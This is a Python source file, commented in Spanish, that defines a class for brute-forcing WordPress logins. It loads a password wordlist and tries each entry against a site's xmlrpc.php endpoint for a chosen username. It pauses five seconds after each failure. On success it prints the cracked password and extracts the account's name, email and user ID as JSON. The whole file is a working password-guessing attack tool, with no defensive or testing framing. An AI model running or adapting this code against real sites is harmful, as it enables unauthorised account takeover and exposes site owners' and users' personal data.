from time import sleep
import json
from wordpress_xmlrpc import Client
from wordpress_xmlrpc.methods.users import GetUserInfo
from colorama import Fore


class WordPressBruteForce:
    def __init__(self, wp_domain, wp_username):
        self.wp_domain = wp_domain
        self.wp_username = wp_username

    def authenticate_user(self, wp_password) -> json:
        wp_url = 'http://{}/xmlrpc.php'.format(self.wp_domain)
        client = Client(wp_url, self.wp_username, wp_password)

        try:
            user_info = client.call(GetUserInfo())
            print(Fore.GREEN + 'Autenticación -> "{}" | Password: "{}"'.format(self.wp_username, wp_password) + Fore.RESET)

            # Imprimimos la información del usuario
            print('Nombre de usuario:', user_info.username)
            print('Nombre:', user_info.first_name)
            print('Apellido:', user_info.last_name)
            print('Correo electrónico:', user_info.email)
            print('ID de usuario:', user_info.id)

            user_dict = {
                'name': user_info.display_name,
                'email': user_info.email,
                'id': user_info.id,
                'url': user_info.url,
                'username': user_info.username
            }

            user_json = json.dumps(user_dict)
            return user_json

        except Exception as e:
            if 'Incorrect username or password.' in str(e):
                print(Fore.RED + 'Contraseña para "{}" Incorrecta.'.format(wp_password.strip()))
            return False

    def brute_force_attack(self, file_name):
        with open(file_name, 'r') as file:
            passwords = file.readlines()

        for password in passwords:
            if self.authenticate_user(password.strip()):
                break
            else:
                pass
                sleep(5)

